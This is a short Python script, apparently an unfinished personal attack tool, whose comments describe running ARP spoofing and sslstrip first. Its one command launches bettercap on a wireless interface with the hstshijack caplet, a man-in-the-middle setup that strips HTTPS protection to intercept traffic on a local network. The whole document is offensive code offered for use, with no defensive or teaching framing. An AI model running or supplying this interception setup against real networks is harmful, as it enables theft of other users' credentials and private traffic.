'''
First run an arp spoofing attack
Note:
    1) sslstrip only looks at packet that pass thru port 10000
IMPROVEMENTS NEEDED:
    1) Add paramaters
        Take in a file name that runs an attack, execute that attack after sslstrip is set up
'''
import subprocess

'''
Packet Sniffer
'''
#Run arpspoof and packetsniffer at the same time
subprocess.call(["bettercap", "-iface", "wlan0", "-caplet", "hstshijack/hstshijack"])
